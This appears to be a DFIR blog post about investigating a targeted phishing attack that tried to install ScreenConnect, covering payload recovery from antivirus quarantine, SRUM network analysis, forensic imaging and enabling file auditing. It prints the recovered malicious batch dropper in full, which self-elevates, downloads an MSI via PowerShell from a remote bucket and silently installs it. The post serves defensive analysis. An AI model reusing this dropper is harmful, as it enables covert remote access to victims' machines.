Dissecting a ScreenConnect Phishing Attack: From Bat File to SRUM Analysis

2026-03-17 · 12 min read
IR DFIR splunk

A targeted phishing campaign hit our org with emails crafted specifically for internal distribution lists — the attackers knew our DL names and department structure. One user clicked. Here's the full investigation, from initial detection to payload recovery to proving no data left the building.

Names, domains, and identifiers have been sanitized.

Initial Detection

Cisco Secure Endpoint (AMP) fired on a malicious file download — W32.06B3AF2617-90.SBX.TG, disposition Malicious, risk score 100. The file was Doc38964834-PDF.bat, downloaded via Chrome to a user's Downloads folder. AMP logged 17 threat detections, 10 quarantine failures, and 7 successful quarantines over the next hour.

The machine was immediately isolated from the network and the AD computer object was disabled. We killed all Chrome processes remotely via CIM/DCOM and started pulling AMP trajectory data through the API.

The Phishing Campaign

Barracuda email logs showed a coordinated campaign — 7 emails from different addresses on a single compromised domain, all sent at the same timestamp, all routed through Google's smtp-relay. Subject lines were AP/invoice lures with unique reference numbers.

4 out of 7 emails made it through. Barracuda scored them at 1.2 against a kill threshold of 3.0. The other 3 were blocked with scores of 4.5 and 9.5. The attackers hit multiple distribution lists, a shared mailbox, and individual users directly. 16 users were potentially exposed.

The phishing emails were targeted. The attackers knew our distribution list names and org structure. This wasn't spray-and-pray.

Attack Chain

Chrome history and AMP trajectory gave us the full chain:

  1. User receives phishing email with link to beaglermap[.]com
  2. Landing page disguised as "View & Sign Form" (DocuShare lookalike)
  3. Page delivers Doc38964834-PDF.bat (1,486 bytes)
  4. Bat file connects to C2 at nacionalrastreamento[.]com[.]br
  5. Payload attempts to download and silently install ScreenConnect from a Cloudflare R2 bucket

Recovering the Payload

AMP quarantined the bat file before it could finish executing, and the file was no longer on disk. But AMP's quarantine vault stores copies.

We found 7 quarantined copies in C:\Program Files\Cisco\AMP\Quarantine\. AMP encrypts quarantine files, but it's just single-byte XOR. A quick Python script to try all 256 keys:

data = open('quarantined_file.qrt', 'rb').read()
for key in range(256):
    decoded = bytes([b ^ key for b in data])
    if b'@echo' in decoded:
        print(f'Key: 0x{key:02X}')
        print(decoded.decode('ascii', errors='replace'))
        break

Key was 0x77. The full payload:

@echo off
setlocal EnableDelayedExpansion

net session >nul 2>&1
if %errorlevel% neq 0 (
    powershell -Command "Start-Process '%~f0' -Verb RunAs"
    exit /b
)

set "URL=https://[redacted].r2.dev/[path]/ScreenConnect.ClientSetup.msi"
set "FILENAME=%TEMP%\ScreenConnect.ClientSetup.msi"

powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"Invoke-WebRequest -Uri '%URL%' -OutFile '%FILENAME%'"

msiexec /i "%FILENAME%" /qn /norestart
del "%FILENAME%" /f /q

It's an RMM tool abuse attack. The bat file tries to auto-elevate via UAC, downloads a ScreenConnect (ConnectWise Control) MSI from a Cloudflare R2 bucket, and silently installs it. Attacker gets persistent remote access through a legitimate remote management tool that blends in with normal IT software.

Good news: ScreenConnect was NOT installed. No files, services, or registry entries found. AMP caught the bat file before the MSI download completed. The UAC prompt also would have blocked it since the user wasn't a local admin.

The Data Exposure Question

Here's where it got serious. The compromised user works with sensitive legal cases involving minors. Chrome history showed they had been downloading confidential court documents, case files from a state agency's managed file transfer, and internal safety plan recommendations — including files with named individuals. All of this in the days surrounding the infection.

The machine also had multiple mapped network drives, including shares for legal documents and case attachments. The question: did any of this data get out?

SRUM Analysis

The System Resource Usage Monitor (SRUM) database tracks per-process network byte counts in hourly buckets. It's stored as an ESE database at C:\Windows\System32\sru\srudb.dat. We copied it using VSS and parsed it with SrumECmd.

Results for the infection hour (16:00-17:00 UTC, infection at 16:31):

ProcessSentReceivedNotes
chrome.exe272 KB860 KBNormal browsing
Teams4 MB109 MBMeeting traffic

SMB10 MB3.8 MBNetwork shares

Chrome sent only 272 KB during the infection hour. You cannot exfiltrate case files or court documents in 272 KB. No unknown or suspicious processes appeared with network activity. All traffic was attributed to known legitimate applications.

The following hour showed Chrome sending 36 MB / receiving 123 MB — but Chrome history confirmed the user was downloading court PDFs from a legal e-filing platform during that window. Normal activity.

SRUM is the strongest artifact we had. Without it, we would have been stuck at "can't prove it, can't disprove it." With it, we could confidently say no significant data left the machine.

False Positives

Two things flagged in the AMP trajectory that turned out to be nothing:

rpcnet.exe in C:\Windows\SysWOW64\ — registered as a Windows service, looked like malware persistence. Turned out to be the legitimate Absolute Software (Computrace) endpoint agent. Verified by checking the digital signature: valid EV code signing cert from Absolute Software Corp. Sandbox analysis confirmed it — 7/10 score because endpoint management tools trigger the same heuristics as malware (persistence, privilege escalation, system modification).

Port 33370 connections to internal IPs — looked like lateral movement. Traced to ldiscnupdate.exe, the LANDesk/Ivanti endpoint management agent. Normal management traffic.

Forensic Imaging

We imaged the NVMe using CAINE (forensic Linux distro) via Ventoy on a USB drive. This was on a newer Dell laptop with a recent chipset, which caused some fun:

  • Porteus 5.0 — kernel too old for the I2C-HID keyboard controller. Internal and external keyboards both dead. System locked up.
  • Paladin — locked up before GRUB even loaded. Tried RAID/AHCI switch, disabled VMD, different USB ports. Nothing worked.
  • CAINE via Ventoy — booted successfully. Guymager for E01 imaging to an external drive.

Lesson: always have multiple forensic distros ready. New hardware will break at least one of them.

Standing Up Auditing Mid-Incident

When we tried to check file server access logs to see what the user had accessed on the sensitive shares, we found... nothing. Zero Security events. File access auditing wasn't enabled on any of our file servers.

So we fixed it during the incident:

  1. auditpol — enabled File System, File Share, and Detailed File Share auditing (Success + Failure)
  2. SACLs — set audit rules on sensitive share paths
  3. Splunk Universal Forwarder — deployed to all file servers, forwarding Security event logs

Within 30 minutes we had 228K file access events flowing into Splunk. One user was generating 174K events alone — turned out to be Cisco AMP's sfc.exe scanner hitting the shared drive. Added a filter to exclude AMP scanner noise.

index=* (host=fileserver*) EventCode=5145
  NOT Process_Name="*\\sfc.exe"
  NOT Account_Name="*$"
| stats count by Account_Name, Share_Name
| sort -count

Not ideal to be deploying monitoring during an IR, but the alternative was having zero visibility for the next incident too.

Key Takeaways

  • SRUM is invaluable. Per-process network byte counts in hourly buckets. It's the difference between "we don't know" and "we know." Collect it early — esentutl /y /vss to copy the locked file.
  • AMP quarantine files are recoverable. Single-byte XOR encryption. Don't assume the payload is gone just because AMP quarantined it.
  • RMM tool abuse is the new RAT. ScreenConnect, AnyDesk, TeamViewer — attackers use legitimate tools because they blend in. Block unauthorized RMM tools at the policy level.
  • Targeted phishing is hard to stop at the gateway. A spam score of 1.2 against a threshold of 3.0 means the email looked legit. DKIM passed. SPF passed. The only defense was user awareness, and one out of 16 users clicked.
  • File access auditing should be on before you need it. We got lucky with SRUM. Next time we might not have that artifact, and we'd need the file server logs to answer the exfil question.
  • Have multiple forensic boot options. Modern hardware breaks old kernels. Ventoy with CAINE, Paladin, and Porteus on one USB is the way to go.
